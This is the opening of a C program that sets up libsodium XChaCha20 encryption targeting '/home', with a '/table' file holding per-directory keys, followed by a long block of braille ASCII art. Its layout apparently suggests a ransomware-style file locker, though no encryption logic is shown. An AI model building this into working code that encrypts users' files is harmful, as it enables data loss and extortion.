#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#include <fcntl.h>
#include <sys/types.h>
#include <dirent.h>

#include <sodium.h>

#define ENCRYPT	0
#define DECRYPT 1

#define BUFFER_SIZE 1024

#define STARTING_PATH	"/home"
#define KEYS_FILE		"/table"

#define KEY_LEN     crypto_secretstream_xchacha20poly1305_KEYBYTES
#define HEADER_LEN  crypto_secretstream_xchacha20poly1305_HEADERBYTES
typedef crypto_secretstream_xchacha20poly1305_state crypto_state;

typedef struct list_s
{
	unsigned char	key[KEY_LEN];
	unsigned char	header[HEADER_LEN];
	char			*dir_path;

	struct list_s	*next;
}				list_t;


char *ascii_art = \
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⢠⢾⢿⣸⠃⡆⢸⠀⠀⠀⡁⠀⠀⠀⠀⠀⢀⢦⢸⡑⢮⣑⢺⣽⣮⢍⣛⣧⢯⡹⣍⢯⣙⢏⠿⣎⡭⢻⣌⣷⢩⠯⡽⣙⡻⢦⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⢻⣿⢧⣈⣻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⢠⡟⡿⡆⡇⠸⠀⠸⠀⠀⠀⡁⠀⠀⣠⠆⡆⡜⣸⢼⢩⠲⡜⢢⣷⢿⣮⡱⢎⡷⣧⡙⢮⠜⣮⡙⠽⣾⡡⢿⡜⣏⠳⣍⠣⣝⢫⢧⢻⣿⣮⠱⡩⢿⣏⣿⣿⣿⡿⢿⣿⣿⢿⣿⢿⣿⣿⠚⠛⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⠃⡾⢹⢇⣹⠀⢂⡄⣘⠀⠀⠀⡅⢀⢠⢃⠞⣸⠰⣹⡼⣧⢛⡜⢣⢽⣾⣿⣧⣛⠼⣹⢮⡙⡞⡴⣩⠳⣍⢿⣚⣷⢭⡛⣬⠳⣌⢻⡞⣯⣿⣿⡱⣙⢬⣻⣿⢻⣿⣿⣷⣮⢽⣻⢿⡜⣿⣿⣧⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⡇⣸⠣⣸⢸⡏⠀⡞⠀⣇⠀⢀⡞⡇⡜⢢⢍⠺⣐⠳⡘⣗⣿⡇⢎⡱⢊⣿⣿⣿⣿⣜⡱⢎⢿⣜⡱⢣⡛⡜⣎⢿⣽⣎⠷⣡⠟⣬⢣⢿⣻⢿⣿⣷⡩⣶⣿⣿⣧⢻⣿⣿⣿⣿⣿⣞⣿⣿⣯⢿⣇⠀⣘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢡⡏⢰⡟⢸⡇⠀⠃⡄⣷⠀⡏⡔⣯⠘⡥⢎⢣⢃⠯⡔⣻⢼⢿⢢⡱⣉⢾⣳⠘⢿⣿⡷⣍⠞⡼⢷⡫⣜⠵⣊⡎⢿⣿⡳⢥⡛⡴⣋⠾⣟⡧⢿⣽⢷⣿⣿⡞⣷⣫⢿⣿⣿⣿⣟⢿⣿⣷⣯⣿⣿⡄⢋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⣼⠁⢸⡇⢸⡇⡀⢸⠡⢼⡒⡱⠌⣷⣉⠖⡭⢲⡉⠖⣱⢸⡞⣿⣇⠲⢥⣊⢿⡆⡈⠙⢿⣝⡻⣜⡣⢟⣮⡝⣲⣙⢎⢿⣏⢧⡝⡲⣍⠞⣧⣿⣩⣿⣿⠿⣿⣿⣿⢧⣯⣿⣿⣞⣿⣿⣿⣿⣿⡿⣿⣷⣤⣀⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣇⡏⠀⢸⡇⢸⡇⡜⢢⡙⢼⣣⠱⡉⢾⡤⢋⡔⢣⠜⡱⢌⡒⣻⢻⣷⡝⣢⠞⡸⣷⢡⠀⠀⠉⠳⣍⡟⣾⣔⡻⢧⣚⠼⣪⣿⡗⢮⠵⣎⢏⢿⣹⡦⢽⣻⣯⡽⣷⡿⣿⡿⡿⢿⣯⣞⡿⣝⣿⣞⣿⣿⣿⡌⠉⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠉⠉⠑⠀⠀⠤⢄⡀⠀⠀⢸⣻⠁⢀⣼⡇⢼⡗⣌⠣⡜⣸⣧⢣⠑⡘⣷⡡⢚⠤⣋⠴⢣⠱⣚⣿⣟⣷⡡⢞⣥⣿⣶⡤⠖⠒⠒⠚⠓⠧⣫⢟⣷⣽⣣⢇⣿⣿⡩⢞⡜⢮⣹⢿⣏⠾⣿⣿⣿⣞⣿⣿⣷⣏⢯⣿⣯⣿⠽⣾⣧⢟⣿⣿⣇⠀⠀⣿⠹⡆⠀⠀⠀⠠⣶⣻⡹⣼⡽⠃⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡋⠀⠀⠀⢀⠠⠀⠂⢀⢠⠃⠀⠀⣿⣹⢀⡼⡰⣯⢘⣿⠤⡓⢬⠐⣿⡆⡍⢒⣻⣧⢩⠒⡥⢎⡣⡝⡤⢻⡽⣿⣿⠽⣋⠜⣳⡄⠀⠀⠀⠀⣀⣀⣈⠙⠲⢭⡻⢿⣾⣿⣱⢫⡜⢧⢺⡟⣧⡟⣿⣿⠟⠋⠀⣀⣀⡈⠙⢾⣿⣝⢿⣽⡷⣯⣿⣿⣿⠀⠀⣹⠆⢻⡄⠀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠒⠦⣤⣀⡐⣀⠖⠁⠀⠀⠀⣿⣼⠚⡥⡑⢿⣂⢿⡧⡙⢆⠩⢼⣷⡌⢣⠼⣿⣧⢹⠰⢣⡱⢎⡱⢣⢻⣿⣯⢷⡈⢞⡰⢳⡀⠴⢊⣉⣤⣴⣶⣶⣦⣤⣽⣛⡻⢿⣧⠳⡜⣭⢺⣏⣷⡹⣿⡇⠀⡴⠋⠀⠀⠈⠢⡀⢹⣿⣷⣝⣿⣵⣿⣿⣿⡄⠀⣼⠁⠸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⢰⣿⡏⡱⢢⣹⡞⣳⢺⣷⢉⡜⢌⡚⣿⣯⠒⣌⢻⣯⣧⡙⢦⡑⢎⡱⢍⡖⠦⢿⣧⢻⡔⣌⠣⢳⣴⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⡱⣉⠦⣹⢶⣏⢷⣿⡇⢰⢥⣀⠀⠀⠀⠀⠱⡈⣿⣞⣿⣿⣛⣿⣿⣿⡇⠀⡾⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣟⡧⣑⣳⠃⠀⢸⡆⣿⠆⡜⢢⠜⡹⡿⣷⣸⣮⢿⣯⣷⡂⣍⠲⡘⢢⠜⢣⡍⣿⣧⠙⢦⠩⣽⣿⡿⢛⣿⣿⣿⣿⣷⣶⣿⡄⠙⣿⣿⠶⢥⠚⣼⢻⣏⢾⡻⡇⡞⠳⣌⠱⣄⠐⠀⠀⡇⢹⣾⢿⣿⣿⣯⣿⣿⡇⢠⠃⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠟⢳⠀⠀⠀⠀⢸⣿⣷⢠⢿⠀⠀⠈⡧⣹⡗⣌⢣⢎⡱⢻⣿⣯⠰⡩⢧⡙⢿⣤⠣⣙⢢⠙⢦⡘⡜⢯⣷⡀⠛⠭⠖⠋⢸⣿⢿⣋⡿⠯⡟⣹⡇⢠⠋⣿⡘⠦⡙⣼⣿⡹⣾⣇⠃⣧⠤⠼⠃⠈⠢⣌⣠⠇⣼⣿⣿⣻⣿⣿⢿⣿⡷⠎⠀⠀⢰⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠈⠇⠀⠀⠀⢸⣽⢻⡌⣿⠀⠀⠀⢳⡔⢿⣌⠲⡌⣵⢏⢻⡽⣷⡠⢍⢳⡌⠻⣷⣈⠦⣙⠢⢜⣰⡭⠟⠙⠀⠀⠀⠀⠀⠻⣮⠉⠂⢀⣀⡿⠗⠙⠀⣽⢌⢣⡑⣾⣷⣽⡿⠁⠀⢿⣀⡤⣖⠒⢄⠀⠀⢠⣿⣾⣿⣿⣿⡿⠀⣿⣿⣄⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡀⠀⠘⡄⠀⠀⠘⣾⠘⣷⢹⡄⠀⠀⠘⣇⠎⣿⡰⡽⢃⠎⣌⠿⣟⣷⣎⡴⡙⣦⡌⠻⢷⡦⠗⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠋⠉⠀⠀⠀⠀⠀⣿⢈⢦⡵⡿⠑⠋⠀⠀⠀⠈⣏⡧⠀⠙⠘⣀⠤⠞⠷⣿⣿⣿⣿⡇⠠⢿⠘⣟⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠰⡄⠀⠀⣿⡇⢻⣞⣧⠀⠀⠀⢹⡎⡜⢿⡡⣉⠖⣩⣾⣿⣿⣿⢿⣿⣷⡿⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡾⠝⠋⠀⠀⠀⠀⠀⣠⠏⢉⠠⢄⡶⠋⠁⠀⠀⢀⣼⣿⢟⡿⠀⠀⡜⠀⠸⡞⣆⠀⠀⠀⠠⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠘⡄⠀⢸⡇⠜⣿⣻⡄⠀⠀⠀⢻⡰⣉⢷⣌⢲⣿⡟⣸⡏⣿⡿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠴⠃⡠⠊⠀⠀⠀⠀⣰⣿⣿⠏⣼⠃⠀⢠⠇⠀⠀⢻⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠘⢆⠀⣷⠐⢿⣿⣷⠀⠀⠀⠈⣿⣔⣊⢻⣿⣿⣴⠞⢻⣟⢻⠜⠀⡹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⢀⣾⣿⣿⠋⢠⠃⠀⠀⠊⠀⠀⣀⠬⠤⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠀⠣⡈⣇⠀⢻⣿⡄⠀⠀⠀⢸⣿⣷⣆⣻⣿⠟⠢⢀⠙⢻⠶⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠋⠀⠀⠀⠀⢠⣾⣿⡿⠁⡰⠁⠀⠀⠀⡠⠔⠉⠀⠀⠀⠀⣸⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⡀⠀⠀⠑⢜⢧⡀⠻⣿⠀⠀⠀⠀⢿⣺⣻⢿⡀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠃⠀⠀⠀⠀⢠⣿⣿⠏⠀⠀⠀⠀⢀⠴⠊⠀⠀⠀⠀⢀⡠⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⡄⠀⠀⠈⠫⣷⣤⡹⣇⠀⠀⠀⠘⣷⢿⣾⡽⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⡴⠖⠚⠓⠓⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⠏⠀⠀⠀⠀⢠⣿⡿⠁⠀⠀⠀⢀⠔⠁⠀⠀⠀⠀⢀⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢄⠀⠀⠀⠈⠙⢛⡋⠀⠀⠀⠀⠺⣿⣞⣿⣯⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡭⠒⠉⠂⠉⠀⠁⠈⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡟⠀⠀⠀⠀⢠⠟⣹⣁⠀⠀⢀⠔⠁⠀⠀⠀⠀⢀⡔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⡑⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠔⠒⠈⢇⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠙⣿⣾⣽⣻⣿⠯⠗⠢⠀⠀⠀⠀⠀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⣸⣿⡿⠀⠀⠀⠀⢀⠏⠀⠋⠉⠓⡴⠃⠀⠀⠀⠀⠀⡠⠋⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡖⠉⠀⠀⠤⡔⠒⢺⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣻⣽⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⡡⠎⣼⣿⠁⠀⠀⠀⠀⡎⠀⠀⠀⣠⠊⠀⠀⠀⠀⠀⣠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⢀⠎⠙⠛⠒⠚⠓⠒⠉⠉⠑⢤⡀⠀⠀⠀⠈⣿⣿⣿⡾⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠢⠤⠤⠒⠋⠀⠀⠀⠀⠀⠀⠀⠀⢠⡼⢋⠴⡁⠎⢼⠇⠀⠀⠀⠐⣸⠁⠀⢀⠔⠁⠀⠀⠀⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣦⣠⠋⠘⢄⠀⠀⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⣀⡀⠀⢹⣻⣿⣽⣻⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢣⠐⠥⢂⠅⣨⠏⠀⠀⠀⠀⠀⢿⠀⢠⠊⠀⠀⠀⠀⢀⣴⠁⠀⠀⠀⠀⣀⣤⡶⣞⡿⣏⣯⣝⡻⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢦⡀⠈⠳⡀⠀⠀⠑⠒⠰⢢⢶⡄⠀⠀⠀⠀⠀⠀⠉⠛⠉⣷⢺⡽⣿⣧⣽⣿⣿⣷⣦⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⢚⠡⡘⠤⢉⢂⣡⡸⠃⠀⠀⠀⠀⠀⠐⠚⡷⠃⠀⠀⠀⠀⢠⠞⠀⠀⢀⣠⣶⠿⣏⣷⡻⣵⣻⢞⡵⢮⡱⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠈⠢⢤⣤⡴⣴⣯⣍⡿⡦⣀⠀⠀⠀⠀⠀⠀⠀⢹⣻⢼⡳⣿⢯⣟⣯⢟⣿⡛⠛⠉⣡⠮⣍⣹⠓⢶⡦⠤⣀⣀⡤⠖⠋⠰⠘⠒⠋⠉⠉⠉⡰⠁⠀⠀⠀⠀⠀⠀⠀⠈⢁⡤⠒⠲⡄⣰⠃⠀⡠⠒⣽⢯⣏⡿⡽⣶⢻⣳⡝⣮⡝⣮⢵⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠈⠱⡤⠤⠤⠴⠒⠲⠚⢹⡑⡌⠳⡆⠀⠀⠀⠀⠀⢸⣽⢣⠿⣽⡿⡾⣽⢺⡜⣇⠀⢷⢧⡐⢠⠃⡍⡐⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⣄⡜⠁⠀⠀⠀⠀⠀⠀⠀⡠⠖⠁⠀⠀⣴⠘⢧⠔⠉⠀⣸⣟⢮⣗⣻⡽⣞⢯⣓⢾⡱⣞⣥⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⢮⣄⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠖⠚⠉⠙⠇⠀⠈⠋⠹⣇⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠙⠀⠀⠀⠀⠀⣿⡜⣫⣟⣵⠟⠛⢳⠿⠾⣟⡷⡌⠳⣻⡏⠲⣤⠑⢺⡄⠀⠀⢀⡤⢦⠀⣠⠞⢁⣴⡫⠔⠒⠒⠢⢄⠀⢀⡤⠊⠀⠀⠀⢀⣴⠃⠀⠈⢧⡀⠀⢻⣞⢯⡞⣧⢻⡜⣮⢝⣮⢳⢧⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠈⠙⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠥⠒⠒⠋⣉⣽⡆⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⣸⡧⢫⡟⠉⠓⡦⢞⣫⡿⠟⠛⠓⠚⢒⡿⣅⠀⠈⢳⡈⡇⢀⠜⠁⠀⢸⡞⡡⠊⠁⠀⠀⠀⠀⠀⠀⠀⠉⠚⠤⣀⠀⠀⢀⡼⣏⢀⡤⠶⢌⣷⡀⢸⣿⢫⡞⣵⢣⣟⣼⠯⣞⡭⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠠⠄⠀⠀⠠⠀⣤⠀⢀⣸⠤⠔⠂⠙⠋⠀⣇⠀⠀⠀⢨⢐⡽⠙⠢⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⣿⣷⠛⠶⣦⠟⣱⡿⠉⠀⠀⠀⣀⣀⣀⣬⠾⢆⠀⠀⢳⡿⠃⠀⠀⠀⢀⡼⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⣀⠀⠀⠉⣷⣩⠖⠋⠉⠀⠀⠈⢧⣿⢻⡜⣧⣻⠼⣛⠭⣎⢻⡜⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⢀⠤⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⢓⠊⠁⠀⠀⠀⠀⠀⠠⠁⡏⠀⠀⢀⣊⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣏⣀⣴⢣⣾⠏⠀⠡⢉⡬⠛⠉⠀⠀⠈⠑⠺⣧⣤⠈⠁⠀⠀⢀⠴⢊⡇⠀⠀⠀⠀⠀⣀⠼⡏⠓⣲⠲⠤⣵⣲⢾⠋⡀⠀⠀⠀⣠⠆⠀⠈⢿⡷⡛⢩⠐⡍⢎⡳⡜⣣⢞⣹⣇⣀⠤⠾⢛⣿⡿⣟⣷⢲⣄⡀⠀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⢀⠂⡇⠀⢐⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⠃⠀⣹⢡⢯⠇⠀⣬⠖⠉⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⠶⠀⣾⣿⠶⣾⠀⠀⠀⠀⠐⠞⠁⡐⢻⡀⠳⠖⠚⢩⡴⠃⡔⠸⣰⠖⠛⠳⣄⠠⠀⢨⣏⠹⣉⠟⠺⠶⣥⢳⣑⢮⡜⣻⣤⢦⡴⣾⢯⣗⢯⡞⣧⣛⢿⡀⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠀⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⣲⠀⠀⢸⡄⠀⠀⠀⠀⠀⡤⠀⢸⣇⡴⠋⠸⢀⣀⠠⠤⠤⠢⢤⡤⡀⣀⣤⣶⠏⠉⣩⣿⣿⣟⢻⢡⢏⣎⠴⠋⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡆⠀⠰⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠁⢼⠆⠀⠀⠀⢯⣠⣼⠥⠞⢁⠀⠀⠀⠉⠃⣴⢋⠆⣓⠰⢊⡑⠦⡈⠝⣯⣾⡽⣽⢿⣶⣽⡿⡹⢎⡿⡜⢧⡹⡚⡇⠀\n"\
"⠀⠀⠀⠀⠀⠀⠀⠰⡅⠀⠀⠀⠀⢀⡀⠤⠔⠂⠁⣠⠞⠉⡇⠀⠈⡷⠀⠀⠀⠀⡼⠁⣰⡟⠋⠀⣴⠟⠁⠀⠀⠀⢀⡀⡼⣲⠿⣛⠵⠎⢀⣴⡿⡟⠁⣈⡏⡼⡛⠁⠀⢀⣠⣴⣶⡿⠟⣫⣽⣿⣿⡏⠉⣿⡟⣿⣷⠀⠀⠉⠙⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠟⡤⢋⠜⡠⢍⢢⠑⢢⠑⡌⡐⢻⡴⣩⢖⡎⢶⣱⣙⢧⡚⣭⠲⣡⢃⢷⡠\n"\
